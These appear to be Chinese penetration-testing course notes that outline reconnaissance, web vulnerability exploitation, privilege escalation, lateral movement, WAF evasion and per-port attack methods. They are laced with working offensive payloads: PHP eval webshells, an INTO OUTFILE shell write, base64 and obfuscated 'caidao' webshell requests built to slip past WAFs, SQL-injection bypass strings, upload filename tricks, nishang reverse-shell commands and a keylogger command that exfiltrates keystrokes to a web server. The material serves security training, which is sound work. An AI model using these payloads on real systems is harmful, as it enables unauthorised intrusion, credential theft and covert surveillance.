###旨在解决渗透测试中遇到的各种疑难问题###

测试目标分类：
WEB，APP，PC，SERVER等
APP:
1.利用抓包分析APP数据包
2.利用反编译逆向APP分析


1.信息收集
#端口
www.xiaodi8.com
www.xiaodi8.com:8080

真实：
http://xxxx.xxx.com.cn/portal/LoginBegin.aspx
http://xxxx.xxx.com.cn:8080/login.jsp

发现：
端口扫描获取  Nmap


#目录
www.xiaodi8.com 门户 phpcms
www.xiaodi8.com/bbs/  论坛  discuz
www.xiaodi8.com/old/  旧版  phpwind

发现：
1.爬行
2.扫描


#IP
#子域名
1.同服务器
2.同网段服务器

课程视频可参考实战全套篇-必看里面

收集：备案信息，网站脚本，数据库，操作系统等
https://blog.csdn.net/qq_41453285/article/details/94888750


#cms程序
开源的网站源码程序，如dedecms，discuz，phpcms，WordPress等
*部分网站也会采用不开源或内部源码搭建

1.开源
源码可以下载到，直接进行代码审计（漏洞挖掘）
利用网上公开的漏洞进行测试验证

2.内部
黑盒测试，只能扫漏洞，测试漏洞

cms识别技术 指纹识别
平台识别 bugscaner 云悉
工具识别 whatweb 御剑指纹识别




#中间件



实验：nginx解析漏洞利用
1.通过访问网站发现中间件为nginx
2.通过网站自带的上传功能上传图片
3.利用解析漏洞访问形式去触发图片后门代码


*通过判断网站使用的中间件，尝试中间件漏洞的验证和利用



#第三方
如何获取第三方软件是否存在？
一般采用端口扫描探针

演示1：HFS第三方软件服务漏洞利用
1.通过端口扫描探针到目标存在8080端口
2.访问获取是第三方软件HFS调用
3.利用公开的HFS漏洞进行验证利用

演示2：phpmyadmin文件包含漏洞利用
1.通过web扫描探针到网站存在phpmyadmin
2.通过phpmyadmin公开漏洞进行验证利用

拓展玩法:
利用phpmyadmin特性,执行sql命令时会将执行的代码写入到session中，
再利用包含漏洞包含该session文件（session文件以cookie中的值命名）
代码：后门代码 select '<?php eval($_POST[x]);?>'





2.漏洞发现
#漏洞问题
1.登录类网站扫描
	带入登录扫描
	带入cookie扫描
2.开源CMS网站程序
3.其他漏洞测试


#WEB漏洞
漏洞分类：sql注入，xss跨站，文件上传，代码执行，文件包含等
漏洞影响：漏洞能干嘛？能实现什么目的？
漏洞扫描：AWVS，Appscan，Netsparker等

1.漏洞扫描发现注入漏洞
2.利用sqlmap进行注入测试



#系统漏洞
漏洞扫描：nessus，openvas
大部分结合MSF



#漏洞具体发现形式
黑盒测试：扫描，探针，搜索等
sql注入
文件上传
XSS跨站
代码执行
逻辑越权
、、、、


漏洞扫描  专业扫描工具去判定（sql注入，xss跨站等）
漏洞探针  人为寻找漏洞去测试（第三方软件或中间件等）

案例：业务逻辑
1.订单金额修改
2.短信接口枚举
3.任意信息查看
。。。。。。。

原因：
可能需要登录状态操作
可能需要变换参数测试

www.xiaodi8.com/member.php?id=1 对应用户xiaodi
www.xiaodi8.com/member.php?id=2 对应用户xxiao

白盒测试：代码审计


#有些漏洞是可以通过扫描工具去发现的，部分漏洞是必须要人为去测试发现的。
漏洞分类：
sql注入，文件上传，xss跨站，代码执行，命令执行，逻辑越权，目录遍历等
可以用扫描工具获取到


dedecms某处注入，phpcms某处上传，discuz某处代码执行，thinkphp5代码执行等
无法扫描工具获取到 需要特定的漏洞插件或专用工具探针 也可以使用公开文档资料判定

#关于漏洞扫描需要采用两种扫描：1.awvs扫描 2.cms插件扫描

3.漏洞利用
漏洞产生：
可控变量 函数
什么函数将导致什么漏洞

$_GET $_POST $_COOKIE $_REQUEST $_FILES $_SERVER


漏洞的影响
1.用于实战 强调权限
2.用于挖掘 强调漏洞
3.用于加固 强调漏洞


sql注入
sqlmap havij pangolin 超级注入工具 啊D 明小子 
数据库类型 Access mysql mssql oracle postsql db2 sybase等



文件上传
burpsuite fiddler fuzz上传字典（模糊测试）
fuzz应用案例：
测试WAF注入或上传绕过时，经常需要对特定关键字或格式进行变异进行绕过测试

xss跨站
xss平台 beef xsser
xss主要结合其他漏洞或方法进行攻击


代码执行

命令执行

文件包含

目录遍历

csrf攻击

业务逻辑


xml
ssrf
。。。。


加固：
1.引用安全软件
2.直接对应修复




漏洞利用问题：
1.安全软件拦截
2.漏洞自身问题

漏洞误报案例:
www.xiaodi8.com/news.php?id=1





4.权限提升

划分：
数据库权限
后台权限
web权限
服务器权限

比如某棋牌网站，得到操作控制数据（开奖数据）的目的？
1.数据库权限
2.web权限
3.服务器权限
4.后台权限

后台权限或数据库权限<==>网站权限==>系统权限

系统漏洞或第三方软件漏洞==>系统权限




#获取网站权限
分类
原因：漏洞的情况
直接获取权限  文件上传 代码执行等
间接获取权限  sql注入 xss跨站等
	后台获取权限相关解释
	获取方法主要看后台的具体功能决定
		1.sql执行
		2.数据库备份
		3.web模版修改
		4.文件上传
		5.其他


案例：
测试本地某网站后台web权限获取：
2.SQL执行
1.文件管理器

http://127.0.0.1/upload//api/addons/zendcheck.php
D:\phpstudy\PHPTutorial\WWW\upload\api\addons\zendcheck53.php

http://127.0.0.1/010/dede/index.php
D:\phpstudy\PHPTutorial\WWW\010\dede\index.php

select '1' into outfile 'D:\\phpstudy\\PHPTutorial\\WWW\\010\\dede.php';
http://127.0.0.1/010/dede.php


技巧：
1.cms的话可以直接通过搜索xxxcms后台拿shell获取操作方法
2.不知道cms或内部程序的话需要通过具体的后台功能来逐个测试


#获取系统权限
webshell提权
1.数据库提权
2.溢出漏洞提权
3.第三方软件提权


案例：通过web权限提升至服务器权限
利用系统溢出漏洞测试提升
1.通过磁盘权限获取上传cmd突破无法执行cmd
2.通过msf生成的反弹exe进行执行反弹
3.接受反弹会话进行exp筛选后执行


案例：通过web权限提升至服务器权限
利用网站数据库进行提升
条件：数据库最高用户的密码
1.通过探针获取服务器上数据库类型mysql
2.通过查看网站数据库配置文件或数据库目录文件获取root密码
3.通过mysql——udf进行权限提升

网站数据库配置文件：命名规则（sql,data,inc,conn,config,database等）
数据库目录文件：安装目录下的/data/mysql/user.myd
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'root' WITH GRANT OPTION;


windows
guest users administrators system

linux
users root

权限维持
其他权限
网站权限
服务器权限

案例：后台权限维持
利用xss跨站脚本进行权限维持

案例：网站权限
后门文件的隐藏变异
后门查杀
https://www.uedbox.com/post/51754/
查杀原理：分析文件中的代码进行划分
后门代码存在相关关键字高危函数

后门免杀
https://xz.aliyun.com/t/5152


PHP后门代码：<?php eval($_POST['x']);?>

1.免杀
	函数替换
	函数字符串猜分组合
	自定义函数
	回调函数
	编码绕过
	
实例：
写一个属于自己的免杀后门
思考：针对其他后门进行免杀处理
1.重新解密分析 一一修改
2.重写规则加密编码

2.隐藏



5.横向渗透
#内网渗透
	主机发现
		存活主机
			计算机名，MAC地址，IP地址
	扫描主机
		端口，系统，漏洞，密码等
	攻击主机
	取得权限


域渗透 工作组
POWERSHELL


192.168.1.100 
192.168.1.0-192.168.1.255
255.255.255.0

端口
案例：135端口渗透测试

协议
案例：ARP欺骗
案例：会话劫持
案例：DNS劫持

口令
getpass minikatz
可以获取windows操作系统的明文密码


内网分为数据库服务器，web服务器，其他的服务器等




会话劫持 COOKIE欺骗 区别
session cookie 用户身份凭据
session存储服务端 存活短
cookie存储客户端 存活长

总结：
http https
cookie session
netfuke cain ettercap arpspoof cobaltstrike 


UAC
端口转发
让内网主动将数据给到外网
A可以连接B B不能连接A
A充当内网地址 B充当外网地址


A 192.168.38.130
lcx.exe -slave 192.168.0.106 3333 127.0.0.1 3389
将本地的3389端口转发至192.168.0.106上的3333端口

B 192.168.0.106
lcx.exe -listen 3333 1111 
监听本地3333端口并转发至1111
然后连接本地的1111即可

实战意义：
解决数据连接问题
绕过防火墙策略

关于文件上传下载的问题：
linux：wget curl
windows powershell（win高版本） ftp脚本（win低版本）

案例：


SSRF
https://www.jianshu.com/p/6bf7700139fa
https://www.zhangshengrong.com/p/281oQGrNwz/


环境：
A主机： 192.168.38.129
B主机： 27.19.126.82 192.168.0.101 
C主机:  192.168.0.106

A能连接B
B能连接C
A不能连接C




攻击者A访问：http://192.168.0.101/ssrf/index.php?url=192.168.0.106:80
通过B主机的ssrf漏洞去探针C主机的80端口

真实环境：
网站服务器ip 202.104.15.185 
存在www.xiaodi8.com网站
同时存在内网IP 192.168.0.105

同网段服务器ip 192.168.0.1 - 192.168.0.255


攻击者可以通过访问www.xiaodi8.com 利用此网站的ssrf漏洞 
去探针192.168.0.1 - 192.168.0.255 上的情况并进行漏洞利用












#安全加固，自定义
#安全开发，自定义
#赛制练习，自定义
#其他补充，自定义

附：详细见论坛靶场
sqlilabs
uploadlabs
xxelab
xssdemo
ssrflab
pikachu
vulhub
xssdemo



===================================================
漏洞发现
https://xz.aliyun.com/t/6282
登陆页面渗透测试常见的几种思路与总结

00x1 sql注入
#万能密码绕过原理
原理：网站后台登录时，会对帐号密码进去判断，返回正确即登录成功，反之失败！利用sql语句中的逻辑运算符（and or xor对应的 且 或 非）进行组合得到返回结果
and  且  
or   或
xor  非

例子：
真 且 真 = 真
真 且 假 = 假
真 或 真 = 真
真 或 假 = 真

常见的后台登录的sql语句
SELECT * FROM admin WHERE username = '$username' and password ='md5($password)';

'or 1=1--
SELECT * FROM admin WHERE username = '' or 1=1--' and password ='md5($password)';

SELECT * FROM admin WHERE username = '' 假
1=1  真 

假 或 真 = 真

#sql注入 post注入
SELECT * FROM admin WHERE username = '$username' and password ='md5($password)';
admin' union select 1,2,3,4...  --

SELECT * FROM admin WHERE username = 'admin' union select 1,2,3,4...  --' and password ='md5($password)';




漏洞发现关注应用：
新闻列表
登录地址
用户中心
后台管理
第三方插件


案例：某微盘交易漏洞测试
1.自带框架漏洞1
2.自带框架漏洞2
3.注册未过滤XSS
4.注册逻辑越权

1.如何判定网站框架或CMS
2.了解常见的框架或cms的漏洞
3.XSS漏洞攻击的理解
4.逻辑越权理解 攻击理解


关注是否存在APP
关注是否存在服务端口
关注是否存在旁注站点
关注是否存在敏感文件
关注是否存在系统安全
关注是否存在口令安全
.............






漏洞利用
某drupal漏洞测试
http://www.babakimaz.com

CMS识别 利用CMS漏洞进行测试（查找漏洞，漏洞利用类型）
国内CMS漏洞查找：百度搜索 seebug等漏洞平台
国外CMS漏洞查找：国外漏洞平台


常规测试：
	漏洞扫描
	目录扫描
	.......





基于CMS利用测试 zoomeye
www.exploit-db.com
cn.0day.today


http://down.chinaz.com/soft/36930.htm





代码审计
白盒测试
1.搭建成功后 利用WEB漏洞扫描工具探针
2.利用网站的源码进行代码审计挖掘漏洞

准备工作：
漏洞产生：函数 可控变量
例：sql注入
函数关键字：mysql_connect mysql_select_db mysql_query等
可控变量关键字：$_GET $_POST $_REQUEST $_SERVER等

定点漏洞挖掘：
分析漏洞产生条件==》
得到漏洞关键字==》
利用工具查找关键字==》
分析文件名进行判断筛选==》
对文件进行代码分析 跟踪变量 ==》
确定是否存在漏洞

附加：数据库监控工具
直接通过页面执行 对应执行的sql语句 进行定点查看

随缘漏洞挖掘：

1.文本批量查找工具

例子:某QQ业务程序源码漏洞发现：
1.漏洞扫描工具Netsparker未获取到有价值的漏洞信息
2.源码分析 代码审计

网站输出业务ID  存在可控变量
保存订单       存在可控变量
输出订单       存在可控变量
输出业务限制   存在可控变量

function ywID($ID){
    
  $SQL="SELECT * FROM  `yw` WHERE  `id` =".$ID." LIMIT 0 , 30";
  $FH=mysql_query($SQL);
  $sj=mysql_fetch_array($FH);
  return   $sj;
    
    
}
$ID=ywID($_GET['id']);

x.php?id=1   ==> ywID(1)  ==> $ID

SELECT * FROM  `dd` WHERE  `ip` LIKE  '192.168.11.11'LIMIT 0 , 30

SELECT * FROM  `dd` WHERE  `ip` LIKE  '127.0.0.1' union select 1,2,3,4,5''LIMIT 0 , 30


框架类 thinkphp yii
框架类代码审计 实例thinkphp

1.找到thinkphp入口文件（index.php）
define('PROJECT_PATH', SITE_PATH . 'lvyecms/');


对应文件
URL访问
开启Trace调试

Lvyecms任意文件删除（thinkphp3.2.3）
index.php?g=Template&m=Style&a=delete&dir=.....///Application/Install/&file=install.lock

微盘21系统SQL注入（thinkphp5）
https://github.com/Mochazz/ThinkPHP-Vuln


漏洞原理
SQL注入  sqlilabs
文件上传  uploadlabs
XSS跨站 xssdemo
其他漏洞综合 pikachu

1.
上传漏洞客户端和服务端验证区别:
本地及服务器验证
本地验证返回时间极短，可通过源代码查看到过滤代码
 
2.
MIME验证
png格式图片
Content-Type: image/png
php格式文件
Content-Type: application/octet-stream

3.
多种格式变异绕过

4.
.htaccess结合apache达到任意解析

5.
大小写绕过

6 7 .
变异解析
空格 点 分号干扰

8.
windows特性 ::$DATA 来绕过后缀过滤

9.
让过滤拆分形成原型php

10.
未进行递归绕过

11.12 
利用可操作的文件路径做文章 结合00截断

13 14 15 16 
文件包含漏洞结合


17-20


WAF绕过
WAF产品研究


安全狗
云锁
宝塔
安骑士
360网站卫士
D盾
护卫神
.....


#WAF防护规则
sql注入拦截
安全工具拦截
xss注入拦截
应用风险拦截
上传漏洞拦截
浏览访问拦截
内容相应防护
资源访问防护


#WAF绕过技术
案例：扫描绕过 内容相应防护
1.御剑扫描无结果 编写的脚本有结果  （请求方式差异）
2.网站出现连接无回复 （访问速度过快）

D:\python3\python.exe E:/myproject/filescan06.py http://localhost dir.txt 10

HEAD http://www.xiaodi8.com/syssite/install/ini_setup.php HTTP/1.1
Host: www.xiaodi8.com
Connection: Keep-Alive



GET http://localhost/1111 HTTP/1.1
Host: localhost
Proxy-Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36 OPR/63.0.3368.94
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Sec-Fetch-Site: none
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7

案例：菜刀工具 安全工具拦截

拦截的菜刀数据包
POST http://192.168.0.104/cd.php?x=bb HTTP/1.1
X-Forwarded-For: 154.9.13.158
Referer: http://192.168.0.104
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Host: 192.168.0.104
Content-Length: 686
Pragma: no-cache

a=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D


a=@eval(base64_decode($_POST[z0]));&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw==






不拦截的菜刀数据包：
POST http://192.168.0.104/cd.php?x=bb HTTP/1.1
X-Forwarded-For: 69.156.102.102
Referer: http://192.168.0.104/
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
Host: 192.168.0.104
Content-Length: 794
Pragma: no-cache

a=array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JEQ9J0Q6XFxwaHBzdHVkeVxcUEhQVHV0b3JpYWxcXFdXV1xcJzskRj1Ab3BlbmRpcigkRCk7aWYoJEY9PU5VTEwpe2VjaG8oIkVSUk9SOi8vIFBhdGggTm90IEZvdW5kIE9yIE5vIFBlcm1pc3Npb24hIik7fWVsc2V7JE09TlVMTDskTD1OVUxMO3doaWxlKCROPUByZWFkZGlyKCRGKSl7JFA9JEQuJy8nLiROOyRUPUBkYXRlKCJZLW0tZCBIOmk6cyIsQGZpbGVtdGltZSgkUCkpO0AkRT1zdWJzdHIoYmFzZV9jb252ZXJ0KEBmaWxlcGVybXMoJFApLDEwLDgpLC00KTskUj0iXHQiLiRULiJcdCIuQGZpbGVzaXplKCRQKS4iXHQiLiRFLiJcbiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygiWEBZIik7ZGllKCk7'));\");"));



案例：SQL注入 绕过拦截
1.干扰字符
2.fuzz结合
3.请求方式




参考：
https://www.anquanke.com/post/id/173474?from=timeline
https://www.cnblogs.com/perl6/p/6120045.html


id=1'union/*%00*/%23a%0A/*!/*!select 1,2,3*/;%23
id=-1%27union/*%00*/%23a%0A/*!/*!select%201,database%23x%0A(),3*/;%23

id=-1%27%20union%20/*!44509select*/%201,2,3%23
id=-1%27%20union%20/*!44509select*/%201,%23x%0A/*!database*/(),3%23

id=1/**&id=-1%27%20union%20select%201,2,3%23*/

id=-1%27%20union%20all%23%0a%20select%201,2,3%23
-1%27%20union%20all%23%0a%20select%201,%230%0Adatabase/**/(),3%23


案例：上传漏洞 绕过拦截
文件名匹配干扰 干扰符
参数变异干扰  截断多参数等

前提条件：存在上传漏洞的情况测试绕过

Content-Disposition 一般可以进行任意修改甚至删除
filename  可以修改
Content-Type  视情况而定 需要考虑网站上传验证是否进行处理

filename="x.php%00.jpg"
filename=php.php
filename="php.php
filename= ;filename="php.php"
filename="x.
p
h
p
"

#WAF脚本编写



#python开发
作用意义：
1.很多漏洞利用代码会采用python去编写
2.根据自己的需求去写python脚本测试



www.xiaodi8.com/index.php?x=1
www.xiaodi8.com/index.php
x=1



requests库安装及使用
参考：https://www.cnblogs.com/zhangxinqi/p/9201594.html

案例：WEB扫描脚本实现   GET
案例：模拟用户登录实现  POST

网络编程 多线程编程 数据库编程


多线程任务处理
端口扫描 子域名 FTP等模块


前期条件：端口扫描


#文件共享服务端口渗透
ftp服务
FTP服务：ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；
默认端口：20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）
攻击方式：
爆破：ftp的爆破工具有很多，Bruter以及msf中ftp爆破模块；
匿名访问：用户名：anonymous  密码：为空或任意邮箱


Samba服务
Samba服务：对于这个可以在windows与Linux之间进行共享文件的服务同样是我们攻击的关注点；samba登录分为两种方式，一种是需要用户名口令；另一种是不需要用户名口令。在很多时候不光是pc机，还有一些服务器，网络设备都开放着此服务，方便进行文件共享，但是同时也给攻击者提供了便利。
默认端口：137（主要用户NetBIOS Name Service；NetBIOS名称服务）、139（NetBIOS Session Service，主要提供samba服务）
攻击方式：
爆破：弱口令（爆破工具采用hydra）hydra -l username -P
PassFile IP smb
未授权访问：给予public用户高权限
远程代码执行漏洞：CVE-2015-0240等等


LDAP协议
ldap：轻量级目录访问协议，最近几年随着ldap的广泛使用被发现的漏洞也越来越多。但是毕竟主流的攻击方式仍旧是那些，比如注入，未授权等等；这些问题的出现也都是因为配置不当而造成的。
默认端口：389
攻击方式：注入攻击盲注 未授权访问
爆破：弱口令


#远程连接服务端口渗透
SSH服务
SSH服务：这个服务基本会出现在我们的Linux服务器，网络设备，安全设备等设备上，而且很多时候这个服务的配置都是默认的；对于SSH服务我们可能使用爆破攻击方式较多。
默认端口：22
攻击方式
爆破：弱口令
漏洞：28退格漏洞、OpenSSL漏洞

Telnet服务：在SSH服务崛起的今天我们已经很难见到使用telnet的服务器，但是在很多设备上同样还是有这个服务的；比如cisco、华三，深信服等厂商的设备；我就有很多次通过telnet弱口令控制这些设备；
默认端口：23
攻击方式
爆破：弱口令
嗅探：此种情况一般发生在局域网

远程桌面连接：作为windows上进行远程连接的端口，很多时候我们在得到系统为windows的shell的时候我们总是希望可以登录3389实际操作对方电脑；这个时候我们一般的情况分为两种。一种是内网，需要先将目标机3389端口反弹到外网；另一种就是外网，我们可以直接访问；当然这两种情况我们利用起来可能需要很苛刻的条件，比如找到登录密码等等；
默认端口：3389
攻击方式：
爆破：3389端口爆破工具就有点多了
Shift粘滞键后门：5次shift后门
3389漏洞攻击：利用ms12-020攻击3389端口，导致服务器关机

VNC服务:一款优秀的远控工具，常用语类UNIX系统上，简单功能强大；也
默认端口：5900+桌面ID（5901；5902）
攻击方式：
爆破：弱口令
认证口令绕过：
拒绝服务攻击：（CVE-2015-5239）
权限提升：（CVE-2013-6886）

#Web应用服务端口渗透
1.中间价平台渗透
	IIS Apache Nginx Weblogic tomcat Jboos Websphere等
	可使用vulhub靶场测试 中间件漏洞集合PDF 未授权访问集合PDF
2.WEB应用程序渗透
	已知CMS 未知CMS 常规漏洞测试


#数据库服务端口渗透
针对所有的	数据库攻击方式都存在SQL注入，这里先提出来在下面就不一一写了免得大家说我占篇幅；当然不同的数据库注入技巧可能不一样，特别是NoSQL与传统的SQL数据库不太一样。但是这不是本文需要介绍的重点，后面有时间会写一篇不同数据库的渗透技巧。

MySQL数据库
默认端口：3306
攻击方式：
爆破：弱口令
身份认证漏洞：CVE-2012-2122
拒绝服务攻击：利用sql语句是服务器进行死循环打死服务器
Phpmyadmin万能密码绕过：用户名：‘localhost’@’@”  密码任意


MSSQL数据库
默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控）
攻击方式：
爆破：弱口令


Oracle数据库
默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）
攻击方式：
爆破：弱口令 漏洞攻击


PostgreSQL数据库
PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括我们kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术  大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。
默认端口：5432
攻击方式：
爆破弱口令：postgres postgres
缓冲区溢出：CVE-2014-2669


MongoDB数据库
MongoDB：NoSQL数据库；攻击方法与其他数据库类似；关于它的安全讲解：请参考
默认端口：27017
攻击方式：爆破弱口令 未授权访问


Redis数据库
redis：是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。Exp：https://yunpan.cn/cYjzHxawFpyVt  访问密码 e547
默认端口：6379
攻击方式：爆破弱口令 未授权访问+配合ssh key提权；


SysBase数据库
默认端口：服务端口5000；监听端口4100；备份端口：4200
攻击方式：
爆破：弱口令 命令注入



DB2数据库
默认端口：5000
攻击方式：
安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）


总结一下：对于数据库，我们得知端口很多时候可以帮助我们去渗透，比如得知mysql的 数据库，我们就可以使用SQL注入进行mof、udf等方式提权；如果是mssql我们就可以使用xp_cmdshell来进行提权；如果是其它的数据 库，我们也可以采用对应的方式；比如各大数据库对应它们的默认口令，版本对应的漏洞！


#邮件服务端口渗透
SMTP协议
smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！
默认端口：25（smtp）、465（smtps）
攻击方式：
爆破：弱口令 未授权访问

POP3协议
默认端口：109（POP2）、110（POP3）、995（POP3S）
攻击方式：爆破弱口令未授权访问

IMAP协议
默认端口：143（imap）、993（imaps）
攻击方式：
爆破：弱口令 配置不当



#网络常见协议端口渗透
DNS服务
默认端口：53
攻击方式：区域传输漏洞

DHCP服务
默认端口：67&68、546（DHCP Failover做双机热备的）
攻击方式：DHCP劫持

SNMP协议
默认端口：161
攻击方式:爆破弱口令

 
#Powershell框架使用 nishang

参考文章：https://www.4hou.com/technology/5962.html

#下载地址:
https://github.com/samratashok/nishang

#安装问题
nishang的使用是要在PowerShell3.0以上的环境中才可以正常使用。也就是说win7下是有点小问题的。win7下自带的环境是PowerShell 2.0

#功能介绍：
![](https://www.4hou.com/uploads/20170703/1499069905558450.png)

演示：端口扫描 密码获取 键盘记录 反弹会话 口令爆破

实战应用：
后续控制 
域渗透 
系统提权



反向链接：

NC下执行 : nc -lvp 3333

在PowerShell下执行：Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.103 -Port 3333

正向链接:

PowerShell下执行:Invoke-PowerShellTcp -Bind -Port 3333

NC下执行:nc -nv 192.168.0.103 3333


测试键盘记录:
.\gather\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebServer -URL http://192.168.254.226/data/catch.php //将记录指定发送给一个可以记录Post请求的Web服务器

解析：Parse_Keys .\key.log .\parsed.txt




#域渗透

#疑难杂症
1.真实案例分析

	无信息

	无漏洞

	无思路
	

2.各种安全限制
	
	无解析
	
	无权限

	无执行


	
#PHP.INI与WEB安全

magic_quotes_gpc
魔术引号： 过滤转义四种字符，对于sql注入有过滤作用
宽字节注入 可以参考注入篇视频

safe_mod
安全模式：禁止php中敏感函数，防御提权及后门调用，漏洞利用

open_basedir
限制后门的访问目录

disable_function
可自定义禁用函数：安全模式升级版，可自定义函数禁用
dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link
参考
disable_function的突破

https://www.cnblogs.com/linuxsec/articles/10966675.html

工具：蚁剑及插件使用

脚本集合：
https://github.com/l3m0n/Bypass_Disable_functions_Shell
http://webshell8.com/down/phpwebshell.zip

php7.x:（不支持windows）
https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php


	
#相关安全设置

目录解析 执行权限：
防脚本后门解析，防调用命令执行等

各种安全策略设置：
IP策略(协议，脚本) 登录验证等

日志分析小技术：
WEB日志，系统日志，数据库日志等

#业务安全实战指南
1.登录认证模块
	登录暴力破解
	Cookie安全
		演示环境：60cms http://down.chinaz.com/soft/23548.htm
	Session安全
		演示环境：https://github.com/adamdoupe/WackoPicko
用户凭据信息
cookie存储本地端 存活时间长
session存储服务端 存活时间可长可短 一般短

http https
		

2.业务办理模块
	手机号篡改
	编号ID篡改
	用户ID篡改
	商品ID篡改
	竞争条件

3.授权访问模块
	水平越权
		yxcms http://www.aspku.com/php/27344.html
		infor
	垂直越权
		pikachu https://github.com/zhuifengshaonianhanlu/pikachu
		以pikachu普通用户操作admin管理用户权限
		借助session信息提交添加用户数据包
	一.测试越权一般得有俩号。
    二.对userid。orderid等等ID要敏感，一旦发现，就多测测。
    三.某些厂商喜欢用纯数字的MD5作为用户的cookie，多注意发现。
    四.多使用抓包工具，多分析数据包，多修改数据包。
    五.多站在开发的角度去分析网站哪儿存在越权。
    六.多看看别人的漏洞（某云小川的越权就讲的很到位）

4.输入输出模块
	sql注入
	xss跨站

5.验证码机制模块
	验证码枚举  
	验证码回显  

6.业务数据安全模块
	支付金额篡改  
	订购数量篡改
	HTTP请求重放
	
7.密码逻辑找回模块
	验证码安全
	token缺陷
	URL跳过

8.业务接口调用模块


#其他漏洞补充
文件下载漏洞
	pikachu 演示
	案例测试：
	变异案例：
目录遍历漏洞
	pikachu 演示
	案例测试：ewebeditor编辑器测试
反序列化漏洞
	参考：https://www.cnblogs.com/xiaoqiyue/p/10951836.html
	拓展利用：JBOOS等

代码执行 thinkphp

命令执行 st2框架

文件包含 phpmyadmin

业务逻辑 上述

变量覆盖 dedecms


#黑暗搜索
#shodan
1.简单介绍

